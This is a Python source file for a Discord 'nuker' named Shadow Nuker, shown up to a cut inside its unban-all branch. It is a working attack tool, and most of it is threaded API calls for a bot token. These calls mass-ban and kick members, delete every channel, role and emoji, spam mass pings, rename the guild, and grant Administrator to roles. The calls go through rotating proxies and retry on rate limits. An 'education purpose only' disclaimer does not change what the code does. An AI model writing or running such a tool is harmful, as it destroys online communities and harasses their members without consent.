"""
SHADOW NUKER BY YUP-CONSOLE

THIS TOOL IS FOR EDUCATION PURPOSE ONLY
I'M (YUP-CONSOLE) ISN'T RESPONSIBLE FOR ANYTHING HAPPENED USING THIS TOOL
"""

import threading, discord, random, httpx, json, time, os
from discord.ext import commands
from itertools import cycle

VERSION = '1.0.0'

__intents__ = discord.Intents.default()
__intents__.members = True
__proxies__, __client__, __config__, __threads__ = cycle(open("proxies.txt", "r").read().splitlines()), commands.Bot(command_prefix="+", help_command=None, intents=__intents__), json.load(open("config.json", "r", encoding="utf-8")), 45
token = __config__["token"]
os.system("cls") if os.name == "nt" else os.system("clear")

shadow_art = """
{}                       ██████  ██░ ██  ▄▄▄      ▓█████▄  ▒█████   █     █░
                     ▒██    ▒ ▓██░ ██▒▒████▄    ▒██▀ ██▌▒██▒  ██▒▓█░ █ ░█░
                     ░ ▓██▄   ▒██▀▀██░▒██  ▀█▄  ░██   █▌▒██░  ██▒▒█░ █ ░█ 
                       ▒   ██▒░▓█ ░██ ░██▄▄▄▄██ ░▓█▄   ▌▒██   ██░░█░ █ ░█ 
                     ▒██████▒▒░▓█▒░██▓ ▓█   ▓██▒░▒████▓ ░ ████▓▒░░░██▒██▓ 
                     ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒  
                     ░ ░▒  ░ ░ ▒ ░▒░ ░  ▒   ▒▒ ░ ░ ▒  ▒   ░ ▒ ▒░   ▒ ░ ░  
                     ░  ░  ░   ░  ░░ ░  ░   ▒    ░ ░  ░ ░ ░ ░ ▒    ░   ░  
                           ░   ░  ░  ░      ░  ░   ░        ░ ░      ░    
                                            ░{}
""".format("\x1b[38;5;51m", "\x1b[0m")
options = """
              ╚╦╗                                                             ╔╦╝
         ╔═════╩══════════════════╦═════════════════════════╦══════════════════╩═════╗
         ╩ ({0}01{1}) {2}Ban Members       ║ ({0}07{1}) {2}Create Roles       ║ ({0}13{1}) {2}Shuffle Channels  ╩
           ({0}02{1}) {2}Delete Channels   ║ ({0}08{1}) {2}Delete Roles       ║ ({0}14{1}) {2}Unban All          
           ({0}03{1}) {2}Kick Members      ║ ({0}09{1}) {2}Delete Emojis      ║ ({0}15{1}) {2}Unban Member       
           ({0}04{1}) {2}Prune             ║ ({0}10{1}) {2}Rename Guild       ║ ({0}16{1}) {2}Mass Nick          
           ({0}05{1}) {2}Create Channels   ║ ({0}11{1}) {2}Rename Channels    ║ ({0}17{1}) {2}Grant Admin        
           ({0}06{1}) {2}Mass Ping         ║ ({0}12{1}) {2}Rename Roles       ║ ({0}18{1}) {2}Exit               
         ╦                        ║                         ║                        ╦
         ╚═════╦══════════════════╩═════════════════════════╩═══════════════════╦════╝
              ╔╩╝                                                              ╚╩╗
""".format("\x1b[38;5;51m", "\x1b[0m", "")

class Shadow:
    def __init__(self):
        self.proxy = "http://" + next(__proxies__) if __config__.get("proxy", False) else None
        self.session = httpx.Client(proxies=self.proxy)
        self.version = 'v10'
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []
        self.members = []

    def execute_ban(self, guild: discord.Guild, member_id: str, token: str):
        try:
            if not member_id.isdigit():
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Invalid member ID \x1b[31m{member_id}")
                return
            payload = {"delete_message_seconds": random.randint(0, 604800)}
            response = self.session.put(
                f"https://discord.com/api/v10/guilds/{guild.id}/bans/{member_id}",
                headers={"Authorization": f"Bot {token}"},
                json=payload
            )
            time.sleep(0.03)
            if response.status_code in [200, 201, 204]:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Banned \x1b[38;5;51m{member_id}")
                self.banned.append(member_id)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_ban(guild, member_id, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions \x1b[38;5;208m{member_id}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to ban \x1b[31m{member_id}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error banning \x1b[31m{member_id}: {str(e)}")

    def execute_kick(self, guild: discord.Guild, member_id: str, token: str):
        try:
            if not member_id.isdigit():
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Invalid member ID \x1b[31m{member_id}")
                return
            response = self.session.delete(
                f"https://discord.com/api/v10/guilds/{guild.id}/members/{member_id}",
                headers={"Authorization": f"Bot {token}"}
            )
            time.sleep(0.03)
            if response.status_code in [200, 201, 204]:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Kicked \x1b[38;5;51m{member_id}")
                self.kicked.append(member_id)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_kick(guild, member_id, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions \x1b[38;5;208m{member_id}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to kick \x1b[31m{member_id}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error kicking \x1b[31m{member_id}: {str(e)}")

    def execute_prune(self, guild: discord.Guild, days: int, token: str):
        try:
            payload = {"days": days}
            response = self.session.post(
                f"https://discord.com/api/v10/guilds/{guild.id}/prune",
                headers={"Authorization": f"Bot {token}"},
                json=payload
            )
            time.sleep(0.03)
            if response.status_code == 200:
                pruned = response.json().get('pruned', 0)
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Pruned \x1b[38;5;51m{pruned}\x1b[0m members")
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_prune(guild, days, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions for pruning")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to prune: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error pruning: {str(e)}")

    def execute_crechannels(self, guildid: str, channelsname: str, type: int, token: str):
        try:
            payload = {
                "type": type,
                "name": channelsname.replace(" ", "-"),
                "permission_overwrites": []
            }
            response = self.session.post(
                f"https://discord.com/api/v10/guilds/{guildid}/channels",
                headers={"Authorization": f"Bot {token}"},
                json=payload
            )
            time.sleep(0.03)
            if response.status_code == 201:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Created \x1b[38;5;51m#{channelsname}")
                self.channels.append(1)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_crechannels(guildid, channelsname, type, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions \x1b[38;5;208m#{channelsname}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to create \x1b[31m#{channelsname}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error creating channel \x1b[31m#{channelsname}: {str(e)}")

    def execute_creroles(self, guildid: str, rolesname: str, token: str):
        try:
            colors = random.choice([0x0000FF, 0xFFFFFF, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0x00FFFF, 0xFF00FF, 0xC0C0C0, 0x808080, 0x800000, 0x808000, 0x008000, 0x800080, 0x008080, 0x000080])
            payload = {
                "name": rolesname,
                "color": colors
            }
            response = self.session.post(
                f"https://discord.com/api/v10/guilds/{guildid}/roles",
                headers={"Authorization": f"Bot {token}"},
                json=payload
            )
            time.sleep(0.03)
            if response.status_code == 200:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Created \x1b[38;5;51m@{rolesname}")
                self.roles.append(1)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_creroles(guildid, rolesname, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions \x1b[38;5;208m@{rolesname}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to create \x1b[31m@{rolesname}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error creating role \x1b[31m@{rolesname}: {str(e)}")

    def execute_delchannels(self, channel: str, token: str):
        try:
            response = self.session.delete(
                f"https://discord.com/api/v10/channels/{channel}",
                headers={"Authorization": f"Bot {token}"}
            )
            time.sleep(0.03)
            if response.status_code == 200:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Deleted \x1b[38;5;51m{channel}")
                self.channels.append(channel)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_delchannels(channel, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions \x1b[38;5;208m{channel}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to delete \x1b[31m{channel}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error deleting channel \x1b[31m{channel}: {str(e)}")

    def execute_massping(self, channel: str, content: str, token: str):
        try:
            response = self.session.post(
                f"https://discord.com/api/v10/channels/{channel}/messages",
                headers={"Authorization": f"Bot {token}"},
                json={"content": content}
            )
            time.sleep(0.03)
            if response.status_code == 200:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Spammed \x1b[38;5;51m{content}\x1b[0m in \x1b[38;5;51m{channel}")
                self.messages.append(channel)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_massping(channel, content, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions \x1b[38;5;208m{channel}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to spam \x1b[31m{channel}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error spamming \x1b[31m{channel}: {str(e)}")

    def execute_rename_channels(self, guild: discord.Guild, channel_id: str, new_name: str, token: str):
        try:
            payload = {"name": new_name.replace(" ", "-")}
            response = self.session.patch(
                f"https://discord.com/api/v10/channels/{channel_id}",
                headers={"Authorization": f"Bot {token}"},
                json=payload
            )
            time.sleep(0.03)
            if response.status_code == 200:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Renamed channel to \x1b[38;5;51m{new_name}")
                self.channels.append(channel_id)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_rename_channels(guild, channel_id, new_name, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions for channel \x1b[38;5;208m{channel_id}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to rename channel \x1b[31m{channel_id}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error renaming channel \x1b[31m{channel_id}: {str(e)}")

    def execute_delroles(self, guildid: str, role_id: str, token: str):
        try:
            response = self.session.delete(
                f"https://discord.com/api/v10/guilds/{guildid}/roles/{role_id}",
                headers={"Authorization": f"Bot {token}"}
            )
            time.sleep(0.03)
            if response.status_code == 204:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Deleted role \x1b[38;5;51m{role_id}")
                self.roles.append(role_id)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_delroles(guildid, role_id, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions for role \x1b[38;5;208m{role_id}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to delete role \x1b[31m{role_id}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error deleting role \x1b[31m{role_id}: {str(e)}")

    def execute_delemojis(self, guildid: str, emoji_id: str, token: str):
        try:
            response = self.session.delete(
                f"https://discord.com/api/v10/guilds/{guildid}/emojis/{emoji_id}",
                headers={"Authorization": f"Bot {token}"}
            )
            time.sleep(0.03)
            if response.status_code == 204:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Deleted emoji \x1b[38;5;51m{emoji_id}")
                self.emojis.append(emoji_id)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_delemojis(guildid, emoji_id, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions for emoji \x1b[38;5;208m{emoji_id}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to delete emoji \x1b[31m{emoji_id}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error deleting emoji \x1b[31m{emoji_id}: {str(e)}")

    def execute_rename_guild(self, guildid: str, new_name: str, token: str):
        try:
            payload = {"name": new_name}
            response = self.session.patch(
                f"https://discord.com/api/v10/guilds/{guildid}",
                headers={"Authorization": f"Bot {token}"},
                json=payload
            )
            time.sleep(0.03)
            if response.status_code == 200:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Renamed guild to \x1b[38;5;51m{new_name}")
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_rename_guild(guildid, new_name, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions for guild rename")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to rename guild: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error renaming guild: {str(e)}")

    def execute_rename_roles(self, guildid: str, role_id: str, new_name: str, token: str):
        try:
            payload = {"name": new_name}
            response = self.session.patch(
                f"https://discord.com/api/v10/guilds/{guildid}/roles/{role_id}",
                headers={"Authorization": f"Bot {token}"},
                json=payload
            )
            time.sleep(0.03)
            if response.status_code == 200:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Renamed role to \x1b[38;5;51m{new_name}")
                self.roles.append(role_id)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_rename_roles(guildid, role_id, new_name, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions for role \x1b[38;5;208m{role_id}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to rename role \x1b[31m{role_id}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error renaming role \x1b[31m{role_id}: {str(e)}")

    def execute_shuffle_channels(self, guildid: str, channel_id: str, position: int, token: str):
        try:
            payload = {"position": position}
            response = self.session.patch(
                f"https://discord.com/api/v10/channels/{channel_id}",
                headers={"Authorization": f"Bot {token}"},
                json=payload
            )
            time.sleep(0.03)
            if response.status_code == 200:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Shuffled channel \x1b[38;5;51m{channel_id} to position {position}")
                self.channels.append(channel_id)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_shuffle_channels(guildid, channel_id, position, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions for channel \x1b[38;5;208m{channel_id}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to shuffle channel \x1b[31m{channel_id}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error shuffling channel \x1b[31m{channel_id}: {str(e)}")

    def execute_unban(self, guild: discord.Guild, user_id: str, token: str):
        try:
            if not user_id.isdigit():
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Invalid user ID \x1b[31m{user_id}")
                return
            response = self.session.delete(
                f"https://discord.com/api/v10/guilds/{guild.id}/bans/{user_id}",
                headers={"Authorization": f"Bot {token}"}
            )
            time.sleep(0.03)
            if response.status_code == 204:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Unbanned \x1b[38;5;51m{user_id}")
                self.banned.append(user_id)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_unban(guild, user_id, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions for user \x1b[38;5;208m{user_id}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to unban \x1b[31m{user_id}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error unbanning \x1b[31m{user_id}: {str(e)}")

    def execute_mass_nick(self, guild: discord.Guild, member_id: str, nickname: str, token: str):
        try:
            if not member_id.isdigit():
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Invalid member ID \x1b[31m{member_id}")
                return
            payload = {"nick": nickname}
            response = self.session.patch(
                f"https://discord.com/api/v10/guilds/{guild.id}/members/{member_id}",
                headers={"Authorization": f"Bot {token}"},
                json=payload
            )
            time.sleep(0.03)
            if response.status_code == 200:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Changed nickname for \x1b[38;5;51m{member_id} to {nickname}")
                self.members.append(member_id)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_mass_nick(guild, member_id, nickname, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions for member \x1b[38;5;208m{member_id}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to change nickname \x1b[31m{member_id}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error changing nickname \x1b[31m{member_id}: {str(e)}")

    def execute_grant_admin(self, guildid: str, role_id: str, token: str):
        try:
            payload = {"permissions": "8"}  # Administrator permission
            response = self.session.patch(
                f"https://discord.com/api/v10/guilds/{guildid}/roles/{role_id}",
                headers={"Authorization": f"Bot {token}"},
                json=payload
            )
            time.sleep(0.03)
            if response.status_code == 200:
                print(f"\x1b[0m(\x1b[38;5;51m+\x1b[0m) Granted admin to role \x1b[38;5;51m{role_id}")
                self.roles.append(role_id)
            elif response.status_code == 429:
                time.sleep(response.json().get('retry_after', 1))
                self.execute_grant_admin(guildid, role_id, token)
            elif response.status_code == 403:
                print(f"\x1b[0m(\x1b[38;5;208m!\x1b[0m) Missing Permissions for role \x1b[38;5;208m{role_id}")
            else:
                print(f"\x1b[0m(\x1b[31m-\x1b[0m) Failed to grant admin \x1b[31m{role_id}: {response.text}")
        except Exception as e:
            print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error granting admin \x1b[31m{role_id}: {str(e)}")

    def menu(self):
        os.system(f"cls & title Shadow Nuker ^| Authenticated as: {__client__.user.name}#{__client__.user.discriminator}") if os.name == "nt" else os.system("clear")
        print(shadow_art + options + "\n")
        ans = input("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) > OPTION: \x1b[38;5;51m:\x1b[0m ")

        if ans in ["1", "01"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            self.banned.clear()
            members = [str(member.id) for member in guild.members]
            if not members:
                print("\x1b[0m(\x1b[31m-\x1b[0m) No members found in the guild")
                time.sleep(1.5)
                self.menu()
            for member_id in members:
                t = threading.Thread(target=self.execute_ban, args=(guild, member_id, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Banned {len(self.banned)}/{len(members)} members")
            time.sleep(1.5)
            self.menu()

        elif ans in ["2", "02"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            self.channels.clear()
            channels = self.session.get(f"https://discord.com/api/v10/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            if not channels:
                print("\x1b[0m(\x1b[31m-\x1b[0m) No channels found in the guild")
                time.sleep(1.5)
                self.menu()
            for channel in channels:
                t = threading.Thread(target=self.execute_delchannels, args=(channel['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Deleted {len(self.channels)}/{len(channels)} channels")
            time.sleep(1.5)
            self.menu()

        elif ans in ["3", "03"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            self.kicked.clear()
            members = [str(member.id) for member in guild.members]
            if not members:
                print("\x1b[0m(\x1b[31m-\x1b[0m) No members found in the guild")
                time.sleep(1.5)
                self.menu()
            for member_id in members:
                t = threading.Thread(target=self.execute_kick, args=(guild, member_id, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Kicked {len(self.kicked)}/{len(members)} members")
            time.sleep(1.5)
            self.menu()

        elif ans in ["4", "04"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            try:
                days = int(input("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Days\x1b[38;5;51m:\x1b[0m "))
                self.execute_prune(guild, days, token)
                time.sleep(1.5)
                self.menu()
            except ValueError:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid input for days")
                time.sleep(1.5)
                self.menu()

        elif ans in ["5", "05"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            try:
                type = input("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Channels Type ['t', 'v']\x1b[38;5;51m:\x1b[0m ")
                type = 2 if type.lower() == "v" else 0
                amount = int(input("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Amount\x1b[38;5;51m:\x1b[0m "))
                self.channels.clear()
                for i in range(amount):
                    t = threading.Thread(target=self.execute_crechannels, args=(guildid, random.choice(__config__["nuke"]["channels_name"]), type, token))
                    t.start()
                    while threading.active_count() >= __threads__:
                        t.join()
                print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Created {len(self.channels)}/{amount} channels")
                time.sleep(1.5)
                self.menu()
            except ValueError:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid input for amount or type")
                time.sleep(1.5)
                self.menu()

        elif ans in ["6", "06"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            try:
                amount = int(input("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Amount\x1b[38;5;51m:\x1b[0m "))
                self.messages.clear()
                self.channels.clear()
                channels = self.session.get(f"https://discord.com/api/v10/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
                if not channels:
                    print("\x1b[0m(\x1b[31m-\x1b[0m) No channels found in the guild")
                    time.sleep(1.5)
                    self.menu()
                for channel in channels:
                    self.channels.append(channel['id'])
                channelz = cycle(self.channels)
                for i in range(amount):
                    t = threading.Thread(target=self.execute_massping, args=(next(channelz), random.choice(__config__["nuke"]["messages_content"]), token))
                    t.start()
                    while threading.active_count() >= __threads__:
                        t.join()
                print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Spammed {len(self.messages)}/{amount} messages")
                time.sleep(1.5)
                self.menu()
            except ValueError:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid input for amount")
                time.sleep(1.5)
                self.menu()

        elif ans in ["7", "07"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            try:
                amount = int(input("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Amount\x1b[38;5;51m:\x1b[0m "))
                self.roles.clear()
                for i in range(amount):
                    t = threading.Thread(target=self.execute_creroles, args=(guildid, random.choice(__config__["nuke"]["roles_name"]), token))
                    t.start()
                    while threading.active_count() >= __threads__:
                        t.join()
                print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Created {len(self.roles)}/{amount} roles")
                time.sleep(1.5)
                self.menu()
            except ValueError:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid input for amount")
                time.sleep(1.5)
                self.menu()

        elif ans in ["8", "08"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            self.roles.clear()
            roles = self.session.get(f"https://discord.com/api/v10/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}).json()
            if not roles:
                print("\x1b[0m(\x1b[31m-\x1b[0m) No roles found in the guild")
                time.sleep(1.5)
                self.menu()
            for role in roles:
                t = threading.Thread(target=self.execute_delroles, args=(guildid, role['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Deleted {len(self.roles)}/{len(roles)} roles")
            time.sleep(1.5)
            self.menu()

        elif ans in ["9", "09"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            self.emojis.clear()
            emojis = self.session.get(f"https://discord.com/api/v10/guilds/{guildid}/emojis", headers={"Authorization": f"Bot {token}"}).json()
            if not emojis:
                print("\x1b[0m(\x1b[31m-\x1b[0m) No emojis found in the guild")
                time.sleep(1.5)
                self.menu()
            for emoji in emojis:
                t = threading.Thread(target=self.execute_delemojis, args=(guildid, emoji['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Deleted {len(self.emojis)}/{len(emojis)} emojis")
            time.sleep(1.5)
            self.menu()

        elif ans in ["10"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            new_name = input("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) New Guild Name\x1b[38;5;51m:\x1b[0m ")
            self.execute_rename_guild(guildid, new_name, token)
            time.sleep(1.5)
            self.menu()

        elif ans in ["11"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            self.channels.clear()
            channels = self.session.get(f"https://discord.com/api/v10/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            if not channels:
                print("\x1b[0m(\x1b[31m-\x1b[0m) No channels found in the guild")
                time.sleep(1.5)
                self.menu()
            for channel in channels:
                t = threading.Thread(target=self.execute_rename_channels, args=(guild, channel['id'], random.choice(__config__["nuke"]["channels_name"]), token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Renamed {len(self.channels)}/{len(channels)} channels")
            time.sleep(1.5)
            self.menu()

        elif ans in ["12"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            self.roles.clear()
            roles = self.session.get(f"https://discord.com/api/v10/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}).json()
            if not roles:
                print("\x1b[0m(\x1b[31m-\x1b[0m) No roles found in the guild")
                time.sleep(1.5)
                self.menu()
            for role in roles:
                t = threading.Thread(target=self.execute_rename_roles, args=(guildid, role['id'], random.choice(__config__["nuke"]["roles_name"]), token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Renamed {len(self.roles)}/{len(roles)} roles")
            time.sleep(1.5)
            self.menu()

        elif ans in ["13"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            self.channels.clear()
            channels = self.session.get(f"https://discord.com/api/v10/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            if not channels:
                print("\x1b[0m(\x1b[31m-\x1b[0m) No channels found in the guild")
                time.sleep(1.5)
                self.menu()
            positions = list(range(len(channels)))
            random.shuffle(positions)
            for channel, position in zip(channels, positions):
                t = threading.Thread(target=self.execute_shuffle_channels, args=(guildid, channel['id'], position, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Shuffled {len(self.channels)}/{len(channels)} channels")
            time.sleep(1.5)
            self.menu()

        elif ans in ["14"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            self.banned.clear()
            bans = self.session.get(f"https://discord.com/api/v10/guilds/{guildid}/bans", headers={"Authorization": f"Bot {token}"}).json()
            if not bans:
                print("\x1b[0m(\x1b[31m-\x1b[0m) No banned users found in the guild")
                time.sleep(1.5)
                self.menu()
            for ban in bans:
                t = threading.Thread(target=self.execute_unban, args=(guild, ban['user']['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
